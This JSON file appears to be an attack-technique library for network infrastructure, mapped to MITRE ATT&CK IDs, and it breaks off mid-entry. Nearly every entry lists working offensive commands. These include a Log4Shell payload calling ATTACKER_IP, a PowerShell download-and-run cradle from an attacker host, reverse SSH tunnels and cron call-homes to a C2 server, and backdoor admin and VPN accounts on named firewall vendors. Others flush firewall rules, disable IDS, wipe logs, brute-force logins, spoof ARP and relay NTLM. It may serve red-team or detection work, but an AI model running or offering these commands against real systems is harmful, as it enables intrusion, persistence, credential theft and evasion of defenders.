{
  "infrastructure": "network",
  "name": "Network Attack Techniques",
  "version": "1.0.0",
  "techniques": [
    {
      "id": "NET-RECON-001",
      "mitre_id": "T1046",
      "name": "Network Service Scanning",
      "phase": "reconnaissance",
      "infrastructure": "network",
      "description": "Scan network ranges to identify live hosts, open ports, and running services",
      "prerequisites": ["Network access to target range"],
      "tools": ["Nmap", "Masscan", "Rustscan", "Zmap"],
      "detection": "IDS/IPS alerts, firewall logs, unusual traffic patterns",
      "references": ["https://attack.mitre.org/techniques/T1046/"],
      "next_techniques": ["NET-RECON-002", "NET-INIT-001"],
      "risk_level": "low",
      "commands": [
        "# Host discovery - identify live hosts on network",
        "nmap -sn 192.168.1.0/24",
        "# TCP SYN scan with service version detection and default scripts",
        "nmap -sS -sV -sC -p- 192.168.1.0/24 -oA nmap_full_scan",
        "# Fast TCP scan of top 1000 ports",
        "nmap -T4 -F 192.168.1.0/24",
        "# UDP scan for common services (DNS, SNMP, DHCP)",
        "nmap -sU -p 53,67,68,69,123,161,162,500,514,1900 192.168.1.0/24",
        "# Aggressive scan with OS detection, version, scripts, traceroute",
        "nmap -A -T4 192.168.1.1",
        "# Masscan - fast port scanning for large networks",
        "masscan -p1-65535 192.168.1.0/24 --rate=10000 -oG masscan_results.gnmap",
        "# Rustscan - fast port scanner with nmap integration",
        "rustscan -a 192.168.1.0/24 -- -sV -sC",
        "# Zmap - fast internet-wide scanner for specific port",
        "zmap -p 443 192.168.1.0/24 -o zmap_results.txt",
        "# Scan through SOCKS proxy for stealth",
        "proxychains nmap -sT -Pn -p 22,80,443 192.168.1.1",
        "# NSE scripts for specific vulnerabilities",
        "nmap --script=vuln 192.168.1.1",
        "# Scan for SMB vulnerabilities",
        "nmap --script=smb-vuln* -p 445 192.168.1.0/24"
      ]
    },
    {
      "id": "NET-RECON-002",
      "mitre_id": "T1018",
      "name": "Network Device Discovery",
      "phase": "reconnaissance",
      "infrastructure": "network",
      "description": "Identify network devices including routers, switches, firewalls, and load balancers",
      "prerequisites": ["Network access"],
      "tools": ["Nmap", "SNMP enumeration", "CDP/LLDP sniffing"],
      "detection": "SNMP queries, unusual network discovery traffic",
      "references": ["https://attack.mitre.org/techniques/T1018/"],
      "next_techniques": ["NET-INIT-002", "NET-CRED-001"],
      "risk_level": "low",
      "commands": [
        "# SNMP enumeration with default community strings",
        "snmpwalk -v2c -c public 192.168.1.1",
        "# SNMP enumeration with onesixtyone for community string brute force",
        "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.0/24",
        "# Enumerate SNMP with snmp-check",
        "snmp-check -c public 192.168.1.1",
        "# CDP/LLDP sniffing to discover network topology",
        "tcpdump -nn -v -i eth0 -s 1500 'ether proto 0x88cc or ether host 01:00:0c:cc:cc:cc'",
        "# Capture CDP packets with Wireshark filter",
        "tshark -i eth0 -f 'ether host 01:00:0c:cc:cc:cc' -w cdp_capture.pcap",
        "# Nmap SNMP enumeration scripts",
        "nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-netstat,snmp-processes 192.168.1.0/24",
        "# Discover network devices by common management ports",
        "nmap -p 22,23,80,443,161,8080,8443 --open 192.168.1.0/24",
        "# Router/Switch fingerprinting",
        "nmap -O --osscan-guess 192.168.1.1",
        "# NetBIOS enumeration for Windows network devices",
        "nbtscan 192.168.1.0/24",
        "# LLDP neighbor discovery with lldpctl",
        "lldpctl"
      ]
    },
    {
      "id": "NET-RECON-003",
      "mitre_id": "T1040",
      "name": "Network Sniffing",
      "phase": "reconnaissance",
      "infrastructure": "network",
      "description": "Capture network traffic to identify credentials, protocols, and sensitive data",
      "prerequisites": ["Access to network segment", "Promiscuous mode capability"],
      "tools": ["Wireshark", "tcpdump", "Responder", "NetworkMiner"],
      "detection": "Promiscuous mode detection, unusual NIC behavior",
      "references": ["https://attack.mitre.org/techniques/T1040/"],
      "next_techniques": ["NET-CRED-001", "NET-CRED-002"],
      "risk_level": "medium",
      "commands": [
        "# Capture all traffic on interface",
        "tcpdump -i eth0 -w capture.pcap",
        "# Capture traffic to/from specific host",
        "tcpdump -i eth0 host 192.168.1.100 -w host_capture.pcap",
        "# Capture HTTP traffic only",
        "tcpdump -i eth0 -A -s 0 'tcp port 80'",
        "# Capture credentials (FTP, HTTP Basic Auth)",
        "tcpdump -i eth0 -A -s 0 'port ftp or port http'",
        "# Wireshark CLI - capture with display filter",
        "tshark -i eth0 -f 'port 445' -w smb_traffic.pcap",
        "# Extract HTTP credentials from pcap",
        "tshark -r capture.pcap -Y 'http.authbasic' -T fields -e http.authbasic",
        "# Responder - capture LLMNR/NBT-NS/mDNS hashes (analyze mode)",
        "responder -I eth0 -A",
        "# Responder - active mode to capture NTLM hashes",
        "responder -I eth0 -wrf",
        "# mitm6 - capture IPv6 DNS traffic for NTLM relay",
        "mitm6 -d domain.local -i eth0",
        "# NetworkMiner for passive analysis (GUI)",
        "networkminer capture.pcap",
        "# Capture SMTP traffic for email credentials",
        "tcpdump -i eth0 -A -s 0 'port 25 or port 587'",
        "# Dsniff for password sniffing",
        "dsniff -i eth0"
      ]
    },
    {
      "id": "NET-RECON-004",
      "mitre_id": "T1595.002",
      "name": "Vulnerability Scanning",
      "phase": "reconnaissance",
      "infrastructure": "network",
      "description": "Scan for known vulnerabilities in network services and applications",
      "prerequisites": ["Network access to targets"],
      "tools": ["Nessus", "OpenVAS", "Qualys", "Nuclei"],
      "detection": "IDS signatures, vulnerability scanner traffic patterns",
      "references": ["https://attack.mitre.org/techniques/T1595/002/"],
      "next_techniques": ["NET-INIT-001"],
      "risk_level": "medium",
      "commands": [
        "# Nmap vulnerability scripts",
        "nmap --script=vuln -sV 192.168.1.1",
        "# Nmap CVE detection scripts",
        "nmap --script=*-cve-* 192.168.1.1",
        "# Nuclei - fast vulnerability scanner",
        "nuclei -u https://target.com -t cves/",
        "# Nuclei with all templates",
        "nuclei -l targets.txt -t nuclei-templates/",
        "# OpenVAS scan via CLI",
        "omp -u admin -w password -h localhost -iX '<create_target><name>Test</name><hosts>192.168.1.0/24</hosts></create_target>'",
        "# Nikto web vulnerability scanner",
        "nikto -h http://192.168.1.1 -o nikto_report.html -Format htm",
        "# WPScan for WordPress vulnerabilities",
        "wpscan --url http://target.com --enumerate vp,vt,u",
        "# SQLMap for SQL injection testing",
        "sqlmap -u 'http://target.com/page?id=1' --batch --dbs",
        "# Searchsploit for local exploit database",
        "searchsploit apache 2.4",
        "# Nmap script for specific CVE",
        "nmap --script=http-vuln-cve2017-5638 -p 8080 192.168.1.1",
        "# Scan for EternalBlue (MS17-010)",
        "nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.0/24"
      ]
    },
    {
      "id": "NET-INIT-001",
      "mitre_id": "T1190",
      "name": "Exploit Network Service",
      "phase": "initial_access",
      "infrastructure": "network",
      "description": "Exploit vulnerabilities in network services to gain initial access",
      "prerequisites": ["Vulnerable service identified"],
      "tools": ["Metasploit", "Custom exploits", "ExploitDB"],
      "detection": "IDS/IPS alerts, crash logs, unusual service behavior",
      "references": ["https://attack.mitre.org/techniques/T1190/"],
      "next_techniques": ["NET-EXEC-001", "NET-PRIVESC-001"],
      "risk_level": "high",
      "commands": [
        "# Metasploit - search for exploits",
        "msfconsole -q -x 'search type:exploit name:apache'",
        "# Metasploit - EternalBlue exploit",
        "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; set LHOST 192.168.1.100; exploit'",
        "# Searchsploit - find exploits locally",
        "searchsploit -m 42315",
        "# Exploit-DB download and compile",
        "searchsploit -x 42315.c && gcc 42315.c -o exploit",
        "# Metasploit - SSH brute force with captured creds",
        "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.1; set USER_FILE users.txt; set PASS_FILE passwords.txt; run'",
        "# CVE-2021-44228 Log4Shell exploitation",
        "curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com/",
        "# ProxyShell/ProxyLogon for Exchange",
        "python proxyshell.py -t https://exchange.target.com -e user@target.com",
        "# Apache Struts RCE (CVE-2017-5638)",
        "python struts-pwn.py -u http://target.com/showcase.action -c 'id'",
        "# Redis unauthorized access exploitation",
        "redis-cli -h 192.168.1.1 CONFIG SET dir /var/www/html && redis-cli -h 192.168.1.1 CONFIG SET dbfilename shell.php",
        "# Jenkins Groovy script console RCE",
        "curl -X POST 'http://jenkins.target.com/scriptText' -d 'script=println \"id\".execute().text'"
      ]
    },
    {
      "id": "NET-INIT-002",
      "mitre_id": "T1133",
      "name": "External Remote Services",
      "phase": "initial_access",
      "infrastructure": "network",
      "description": "Access network via VPN, RDP, SSH, or other remote access services with valid credentials",
      "prerequisites": ["Valid credentials", "Remote access service exposed"],
      "tools": ["VPN clients", "SSH", "RDP clients"],
      "detection": "Remote access logs, unusual login locations",
      "references": ["https://attack.mitre.org/techniques/T1133/"],
      "next_techniques": ["NET-DISC-001", "NET-LATERAL-001"],
      "risk_level": "medium",
      "commands": [
        "# SSH with password",
        "ssh user@192.168.1.1",
        "# SSH with key file",
        "ssh -i id_rsa user@192.168.1.1",
        "# SSH through proxy",
        "ssh -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' user@192.168.1.1",
        "# RDP with xfreerdp",
        "xfreerdp /v:192.168.1.1 /u:user /p:password /cert-ignore",
        "# RDP with rdesktop",
        "rdesktop -u user -p password 192.168.1.1",
        "# OpenVPN connection",
        "openvpn --config client.ovpn",
        "# Cisco AnyConnect VPN CLI",
        "vpncli connect vpn.target.com",
        "# WinRM remote access",
        "evil-winrm -i 192.168.1.1 -u user -p password",
        "# Pass-the-Hash with WinRM",
        "evil-winrm -i 192.168.1.1 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        "# PSExec with credentials",
        "psexec.py domain/user:password@192.168.1.1",
        "# SSH tunnel for port forwarding",
        "ssh -L 3389:192.168.2.1:3389 user@192.168.1.1"
      ]
    },
    {
      "id": "NET-INIT-003",
      "mitre_id": "T1200",
      "name": "Hardware Additions",
      "phase": "initial_access",
      "infrastructure": "network",
      "description": "Plant rogue devices like network implants or dropboxes for network access",
      "prerequisites": ["Physical access to network"],
      "tools": ["LAN Turtle", "Raspberry Pi", "Shark Jack"],
      "detection": "Network device inventory, 802.1X NAC, physical inspection",
      "references": ["https://attack.mitre.org/techniques/T1200/"],
      "next_techniques": ["NET-RECON-003", "NET-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# LAN Turtle - configure reverse SSH shell",
        "# Configure in LAN Turtle web interface at 172.16.84.1",
        "# Raspberry Pi - setup as network dropbox",
        "# Configure autossh for persistent reverse tunnel",
        "autossh -M 0 -f -N -R 2222:localhost:22 attacker@c2server.com",
        "# Create systemd service for persistence",
        "# /etc/systemd/system/reverse-ssh.service",
        "# Shark Jack - payload for network recon",
        "# payload.sh: nmap -sn 192.168.1.0/24 > /root/loot/hosts.txt",
        "# WiFi Pineapple - rogue AP for credential capture",
        "# Configure evil twin attack via web interface",
        "# USB Rubber Ducky - HID attack payload",
        "# STRING powershell -NoP -W Hidden -ep bypass IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')",
        "# Bash Bunny - network attack payload",
        "# payload.txt: ATTACKMODE ECM_ETHERNET",
        "# Configure dropbox for call-home",
        "crontab -e  # Add: */5 * * * * curl http://c2server.com/checkin?id=$(hostname)"
      ]
    },
    {
      "id": "NET-EXEC-001",
      "mitre_id": "T1059",
      "name": "Command Execution on Network Device",
      "phase": "execution",
      "infrastructure": "network",
      "description": "Execute commands on compromised network devices via CLI or API",
      "prerequisites": ["Access to network device"],
      "tools": ["SSH", "Telnet", "Device CLI"],
      "detection": "Device command logs, configuration changes",
      "references": ["https://attack.mitre.org/techniques/T1059/"],
      "next_techniques": ["NET-PERSIST-001", "NET-DEFENSE-001"],
      "risk_level": "high",
      "commands": [
        "# SSH to Cisco device and run commands",
        "ssh admin@192.168.1.1 'show running-config'",
        "# Telnet to network device (legacy)",
        "telnet 192.168.1.1",
        "# Execute commands via SNMP (if write access)",
        "snmpset -v2c -c private 192.168.1.1 1.3.6.1.2.1.1.6.0 s 'new_location'",
        "# Cisco IOS command execution",
        "# enable -> show version -> show running-config",
        "# Juniper JunOS commands",
        "# cli -> show configuration | display set",
        "# Palo Alto PAN-OS commands",
        "# show system info -> show running config",
        "# FortiGate FortiOS commands",
        "# get system status -> show full-configuration",
        "# API-based command execution (Cisco DNA Center)",
        "curl -X GET 'https://dnac.local/api/v1/network-device' -H 'X-Auth-Token: TOKEN'",
        "# Ansible for network device automation",
        "ansible-playbook -i inventory cisco_config.yml",
        "# Netmiko Python library for device interaction",
        "# from netmiko import ConnectHandler; device = ConnectHandler(**cisco_device); output = device.send_command('show version')"
      ]
    },
    {
      "id": "NET-PERSIST-001",
      "mitre_id": "T1542.004",
      "name": "Network Device Firmware Modification",
      "phase": "persistence",
      "infrastructure": "network",
      "description": "Modify router or firewall firmware for persistent access",
      "prerequisites": ["Admin access to network device"],
      "tools": ["Custom firmware", "Device CLI"],
      "detection": "Firmware integrity checks, unexpected device behavior",
      "references": ["https://attack.mitre.org/techniques/T1542/004/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# Cisco IOS - backup current firmware",
        "copy flash:current.bin tftp://192.168.1.100/backup.bin",
        "# Upload modified firmware",
        "copy tftp://192.168.1.100/modified.bin flash:modified.bin",
        "# Set boot variable to modified firmware",
        "config t -> boot system flash:modified.bin -> end -> write memory",
        "# Verify boot variable",
        "show boot",
        "# Cisco IOS - ROM monitor (ROMMON) modification",
        "# Requires physical access or confreg command",
        "# Juniper - backup and upload firmware",
        "request system snapshot",
        "# Upload custom package",
        "request system software add /var/tmp/modified_package.tgz",
        "# FortiGate firmware manipulation",
        "execute restore image tftp modified.bin 192.168.1.100",
        "# Verify firmware integrity (defensive)",
        "verify /md5 flash:firmware.bin"
      ]
    },
    {
      "id": "NET-PERSIST-002",
      "mitre_id": "T1098",
      "name": "Network Device Backdoor Account",
      "phase": "persistence",
      "infrastructure": "network",
      "description": "Create backdoor accounts on routers, switches, or firewalls",
      "prerequisites": ["Admin access to network device"],
      "tools": ["Device CLI", "SSH"],
      "detection": "Account audit, unusual user accounts",
      "references": ["https://attack.mitre.org/techniques/T1098/"],
      "next_techniques": ["NET-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Cisco IOS - create backdoor user with privilege 15",
        "config t -> username backdoor privilege 15 secret StrongP@ss123 -> end -> write memory",
        "# Cisco IOS - create hidden user (type 8 password)",
        "config t -> username admin2 privilege 15 algorithm-type sha256 secret HiddenP@ss -> end",
        "# Cisco ASA - create backdoor user",
        "config t -> username backdoor password StrongP@ss123 privilege 15 -> write memory",
        "# Juniper JunOS - create backdoor user",
        "set system login user backdoor class super-user authentication plain-text-password",
        "# Palo Alto - create admin user via CLI",
        "configure -> set mgt-config users backdoor password -> set mgt-config users backdoor permissions role-based superuser yes -> commit",
        "# FortiGate - create admin user",
        "config system admin -> edit backdoor -> set password StrongP@ss123 -> set accprofile super_admin -> end",
        "# Add SSH key for passwordless access (Cisco)",
        "config t -> ip ssh pubkey-chain -> username admin -> key-string -> [paste public key] -> exit",
        "# Enable hidden telnet access (Cisco)",
        "line vty 5 15 -> login local -> transport input telnet -> end"
      ]
    },
    {
      "id": "NET-PERSIST-003",
      "mitre_id": "T1505.002",
      "name": "VPN/Remote Access Persistence",
      "phase": "persistence",
      "infrastructure": "network",
      "description": "Configure VPN or remote access to maintain persistent network access",
      "prerequisites": ["VPN infrastructure access"],
      "tools": ["VPN management tools", "OpenVPN"],
      "detection": "VPN logs, new VPN user accounts",
      "references": ["https://attack.mitre.org/techniques/T1505/002/"],
      "next_techniques": ["NET-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# OpenVPN - generate client certificate for persistence",
        "./easyrsa build-client-full backdoor_user nopass",
        "# Create client config file",
        "# client.ovpn with embedded certificates",
        "# Cisco ASA - create VPN user",
        "config t -> username vpnbackdoor password StrongP@ss123 -> group-policy VPN_Policy internal -> tunnel-group VPN_Group general-attributes -> default-group-policy VPN_Policy",
        "# FortiGate - create SSL VPN user",
        "config user local -> edit vpnbackdoor -> set passwd StrongP@ss123 -> next -> end",
        "# Add user to VPN group",
        "config user group -> edit SSLVPN_Users -> append member vpnbackdoor -> end",
        "# Palo Alto GlobalProtect - create VPN user",
        "set user-id-agent user-mapping backdoor_user",
        "# WireGuard - add persistent peer",
        "[Peer]\\nPublicKey = <attacker_public_key>\\nAllowedIPs = 10.0.0.100/32",
        "# IPSec VPN - configure site-to-site tunnel",
        "# crypto isakmp policy / crypto ipsec transform-set / crypto map configuration",
        "# Enable split tunneling for stealth",
        "group-policy VPN_Policy attributes -> split-tunnel-policy tunnelspecified -> split-tunnel-network-list value INTERNAL_NETWORKS"
      ]
    },
    {
      "id": "NET-PRIVESC-001",
      "mitre_id": "T1548",
      "name": "Network Device Privilege Escalation",
      "phase": "privilege_escalation",
      "infrastructure": "network",
      "description": "Escalate from user to admin/enable mode on network devices",
      "prerequisites": ["User-level access to network device"],
      "tools": ["Device CLI", "Known exploits"],
      "detection": "Device logs, privilege level changes",
      "references": ["https://attack.mitre.org/techniques/T1548/"],
      "next_techniques": ["NET-EXEC-001", "NET-PERSIST-001"],
      "risk_level": "high",
      "commands": [
        "# Cisco IOS - attempt enable mode",
        "enable",
        "# Cisco IOS - password recovery (requires console access)",
        "# Boot to ROMMON -> confreg 0x2142 -> reset -> copy startup-config running-config",
        "# Brute force enable password",
        "hydra -l '' -P /usr/share/wordlists/rockyou.txt 192.168.1.1 cisco-enable",
        "# Cisco Smart Install exploitation (CVE-2018-0171)",
        "python siet.py -t 192.168.1.1 -m 1",
        "# SNMP privilege escalation (if SNMP RW community string known)",
        "snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.2.1.55.192.168.1.100 i 1",
        "# Juniper privilege escalation",
        "# start shell user root",
        "# FortiGate privilege escalation via CLI",
        "# diagnose sys flash -> access underlying shell",
        "# Exploit known CVEs for privilege escalation",
        "# Search: searchsploit cisco privilege escalation",
        "# TACACS/RADIUS server compromise for credential access",
        "# Compromise TACACS server to obtain all device credentials",
        "# Cisco Type 7 password decryption",
        "# cisco7decrypt.py <encrypted_password>"
      ]
    },
    {
      "id": "NET-DEFENSE-001",
      "mitre_id": "T1562.004",
      "name": "Firewall Rule Modification",
      "phase": "defense_evasion",
      "infrastructure": "network",
      "description": "Modify firewall rules to allow malicious traffic or disable security controls",
      "prerequisites": ["Firewall admin access"],
      "tools": ["Firewall CLI/GUI", "API access"],
      "detection": "Firewall rule audit, configuration change alerts",
      "references": ["https://attack.mitre.org/techniques/T1562/004/"],
      "next_techniques": ["NET-LATERAL-001"],
      "risk_level": "critical",
      "commands": [
        "# Cisco ASA - add permit rule",
        "config t -> access-list OUTSIDE_IN extended permit tcp any any eq 4444 -> access-group OUTSIDE_IN in interface outside",
        "# Cisco IOS - modify ACL",
        "config t -> ip access-list extended ALLOW_ALL -> permit ip any any -> interface GigabitEthernet0/0 -> ip access-group ALLOW_ALL in",
        "# iptables - allow incoming on port 4444",
        "iptables -I INPUT -p tcp --dport 4444 -j ACCEPT",
        "# iptables - flush all rules (disable firewall)",
        "iptables -F && iptables -X && iptables -P INPUT ACCEPT",
        "# Palo Alto - create allow rule via CLI",
        "set rulebase security rules ALLOW_ALL from any to any source any destination any application any action allow",
        "# FortiGate - add firewall policy",
        "config firewall policy -> edit 0 -> set srcintf any -> set dstintf any -> set srcaddr all -> set dstaddr all -> set action accept -> set schedule always -> set service ALL -> next -> end",
        "# Windows Firewall - disable",
        "netsh advfirewall set allprofiles state off",
        "# pfSense - add rule via API",
        "curl -X POST 'https://pfsense.local/api/v1/firewall/rule' -H 'Authorization: TOKEN' -d '{\"type\":\"pass\",\"interface\":\"wan\",\"protocol\":\"any\"}'",
        "# UFW - allow all traffic",
        "ufw disable"
      ]
    },
    {
      "id": "NET-DEFENSE-002",
      "mitre_id": "T1562.001",
      "name": "Network Monitoring Disable",
      "phase": "defense_evasion",
      "infrastructure": "network",
      "description": "Disable or evade network monitoring systems like IDS/IPS",
      "prerequisites": ["Access to monitoring infrastructure"],
      "tools": ["IDS management tools", "Traffic manipulation"],
      "detection": "Monitoring gaps, system health alerts",
      "references": ["https://attack.mitre.org/techniques/T1562/001/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# Snort - stop service",
        "systemctl stop snort",
        "# Suricata - stop service",
        "systemctl stop suricata",
        "# Disable SPAN/mirror port (Cisco)",
        "config t -> no monitor session 1",
        "# Cisco IPS - disable signatures",
        "config t -> no ip ips signature-category -> category all -> retired true",
        "# Palo Alto - disable threat prevention",
        "set deviceconfig system threat -> set spyware action allow -> set vulnerability action allow",
        "# FortiGate - disable IPS",
        "config ips sensor -> edit default -> set comment 'disabled' -> config entries -> delete 1 -> end",
        "# Zeek (Bro) - stop monitoring",
        "zeekctl stop",
        "# Flood IDS to cause resource exhaustion",
        "hping3 --flood --rand-source -p 80 192.168.1.1",
        "# Fragment packets to evade detection",
        "nmap -f -sS 192.168.1.0/24",
        "# Use encryption to avoid content inspection",
        "# All traffic over TLS/SSL or VPN tunnel",
        "# Splunk - delete forwarder configuration",
        "rm -rf /opt/splunkforwarder/etc/apps/search/local/"
      ]
    },
    {
      "id": "NET-DEFENSE-003",
      "mitre_id": "T1070.003",
      "name": "Network Device Log Clearing",
      "phase": "defense_evasion",
      "infrastructure": "network",
      "description": "Clear logs on network devices to hide evidence of compromise",
      "prerequisites": ["Admin access to network device"],
      "tools": ["Device CLI"],
      "detection": "Log forwarding, SIEM gaps, syslog monitoring",
      "references": ["https://attack.mitre.org/techniques/T1070/003/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# Cisco IOS - clear logging buffer",
        "clear logging",
        "# Cisco ASA - clear logs",
        "clear logging asdm",
        "# Juniper JunOS - clear logs",
        "clear log messages",
        "# Palo Alto - clear logs",
        "delete log traffic",
        "# FortiGate - clear logs",
        "execute log delete",
        "# Clear syslog on Linux server",
        "rm -rf /var/log/syslog* /var/log/messages*",
        "# Clear Windows Event Logs",
        "wevtutil cl System && wevtutil cl Security && wevtutil cl Application",
        "# Truncate log files without deleting",
        "truncate -s 0 /var/log/auth.log",
        "# Disable logging temporarily (Cisco)",
        "config t -> no logging buffered -> no logging console",
        "# Modify log timestamps",
        "# Alter NTP settings to create timestamp confusion",
        "# Clear TACACS/RADIUS logs",
        "rm -rf /var/log/tac_plus/*"
      ]
    },
    {
      "id": "NET-CRED-001",
      "mitre_id": "T1552.001",
      "name": "Network Device Configuration Extraction",
      "phase": "credential_access",
      "infrastructure": "network",
      "description": "Extract credentials from network device configurations (SNMP strings, passwords)",
      "prerequisites": ["Access to device or configuration backups"],
      "tools": ["TFTP", "SCP", "Config parsing tools"],
      "detection": "Configuration access logs, TFTP monitoring",
      "references": ["https://attack.mitre.org/techniques/T1552/001/"],
      "next_techniques": ["NET-LATERAL-002"],
      "risk_level": "high",
      "commands": [
        "# Cisco - copy config via TFTP",
        "copy running-config tftp://192.168.1.100/config.txt",
        "# Cisco - copy config via SCP",
        "copy running-config scp://user@192.168.1.100/config.txt",
        "# SNMP config extraction (if SNMP RW string known)",
        "snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1",
        "# Cisco Type 7 password decryption",
        "python cisco_pwdecrypt.py 070C285F4D06",
        "# Cisco Type 5 password cracking (MD5)",
        "john --wordlist=/usr/share/wordlists/rockyou.txt cisco_hashes.txt",
        "# Extract configs from RANCID backup server",
        "find /var/lib/rancid -name '*.config' -exec grep -l password {} \\;",
        "# Oxidized config extraction",
        "cat /var/lib/oxidized/configs/router1.txt",
        "# Parse config for credentials",
        "grep -E 'password|secret|community' running-config.txt",
        "# FortiGate config extraction",
        "execute backup config tftp config.txt 192.168.1.100",
        "# Juniper config extraction",
        "show configuration | display set | save /var/tmp/config.txt"
      ]
    },
    {
      "id": "NET-CRED-002",
      "mitre_id": "T1557",
      "name": "Man-in-the-Middle",
      "phase": "credential_access",
      "infrastructure": "network",
      "description": "Position attacker between victims to intercept and manipulate traffic",
      "prerequisites": ["Network access in same segment"],
      "tools": ["Ettercap", "Bettercap", "mitmproxy", "ARP spoofing"],
      "detection": "ARP anomaly detection, certificate pinning, HSTS",
      "references": ["https://attack.mitre.org/techniques/T1557/"],
      "next_techniques": ["NET-CRED-003", "NET-COLL-001"],
      "risk_level": "high",
      "commands": [
        "# ARP spoofing with arpspoof",
        "arpspoof -i eth0 -t 192.168.1.100 192.168.1.1",
        "# Enable IP forwarding for MitM",
        "echo 1 > /proc/sys/net/ipv4/ip_forward",
        "# Ettercap ARP poisoning",
        "ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//",
        "# Bettercap - full MitM framework",
        "bettercap -iface eth0 -eval 'set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on'",
        "# mitmproxy for HTTP/HTTPS interception",
        "mitmproxy -p 8080",
        "# SSLstrip for HTTPS downgrade",
        "sslstrip -l 8080",
        "# Responder for LLMNR/NBT-NS poisoning",
        "responder -I eth0 -wrf",
        "# mitm6 for IPv6 DNS takeover",
        "mitm6 -d domain.local -i eth0",
        "# ntlmrelayx for NTLM relay attacks",
        "ntlmrelayx.py -t smb://192.168.1.10 -smb2support",
        "# Combined mitm6 and ntlmrelayx attack",
        "# Terminal 1: mitm6 -d domain.local\\n# Terminal 2: ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access",
        "# DNS spoofing with dnsspoof",
        "dnsspoof -i eth0 host 192.168.1.100"
      ]
    },
    {
      "id": "NET-CRED-003",
      "mitre_id": "T1110",
      "name": "Network Service Brute Force",
      "phase": "credential_access",
      "infrastructure": "network",
      "description": "Brute force credentials for network services like SSH, RDP, VPN, SNMP",
      "prerequisites": ["Network access to service"],
      "tools": ["Hydra", "Medusa", "Ncrack", "CrackMapExec"],
      "detection": "Failed login alerts, account lockouts",
      "references": ["https://attack.mitre.org/techniques/T1110/"],
      "next_techniques": ["NET-INIT-002"],
      "risk_level": "medium",
      "commands": [
        "# Hydra SSH brute force",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
        "# Hydra RDP brute force",
        "hydra -l administrator -P passwords.txt rdp://192.168.1.1",
        "# Hydra FTP brute force",
        "hydra -L users.txt -P passwords.txt ftp://192.168.1.1",
        "# Hydra SMB brute force",
        "hydra -L users.txt -P passwords.txt smb://192.168.1.1",
        "# Medusa for parallel brute force",
        "medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh",
        "# Ncrack for network authentication cracking",
        "ncrack -p ssh -U users.txt -P passwords.txt 192.168.1.1",
        "# CrackMapExec SMB password spray",
        "crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!'",
        "# CrackMapExec with pass-the-hash",
        "crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        "# SNMP community string brute force",
        "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1",
        "# Cisco enable password brute force",
        "hydra -l '' -P passwords.txt 192.168.1.1 cisco-enable",
        "# VNC brute force",
        "hydra -P passwords.txt vnc://192.168.1.1"
      ]
    },
    {
      "id": "NET-DISC-001",
      "mitre_id": "T1016",
      "name": "Network Configuration Discovery",
      "phase": "discovery",
      "infrastructure": "network",
      "description": "Discover network configuration including routing tables, VLANs, and segments",
      "prerequisites": ["Network access"],
      "tools": ["traceroute", "VLAN hopping tools", "Device CLI"],
      "detection": "Unusual network queries, SNMP access",
      "references": ["https://attack.mitre.org/techniques/T1016/"],
      "next_techniques": ["NET-LATERAL-001"],
      "risk_level": "low",
      "commands": [
        "# Traceroute to map network path",
        "traceroute 8.8.8.8",
        "# TCP traceroute (more reliable through firewalls)",
        "tcptraceroute 192.168.1.1 80",
        "# Show local routing table",
        "ip route show",
        "# Show local network interfaces",
        "ip addr show",
        "# Discover VLANs via CDP/DTP",
        "tcpdump -nn -v -i eth0 'ether[20:2] == 0x2000'",
        "# SNMP routing table enumeration",
        "snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21",
        "# Show ARP table",
        "arp -a",
        "# Discover network via ICMP",
        "ping -c 1 192.168.1.255",
        "# Nmap to identify network segments",
        "nmap -sn 192.168.0.0/16 --min-rate 10000",
        "# Windows - show network configuration",
        "ipconfig /all",
        "# Windows - show routing table",
        "route print",
        "# DNS zone transfer attempt",
        "dig axfr @192.168.1.1 domain.local"
      ]
    },
    {
      "id": "NET-DISC-002",
      "mitre_id": "T1049",
      "name": "Network Connection Discovery",
      "phase": "discovery",
      "infrastructure": "network",
      "description": "Map active network connections and communication patterns",
      "prerequisites": ["Network access"],
      "tools": ["netstat", "Network scanners", "Traffic analysis"],
      "detection": "Connection monitoring, traffic analysis",
      "references": ["https://attack.mitre.org/techniques/T1049/"],
      "next_techniques": ["NET-LATERAL-001"],
      "risk_level": "low",
      "commands": [
        "# Linux - show all network connections",
        "netstat -tulpn",
        "# Linux - show established connections",
        "ss -tunapl state established",
        "# Windows - show all connections",
        "netstat -ano",
        "# Identify processes with network connections",
        "lsof -i -P -n",
        "# Tcpdump to identify active communications",
        "tcpdump -i eth0 -c 100 -nn",
        "# Wireshark statistics - protocol hierarchy",
        "tshark -r capture.pcap -q -z io,phs",
        "# Identify top talkers",
        "tshark -r capture.pcap -q -z conv,ip",
        "# Nmap to identify active services",
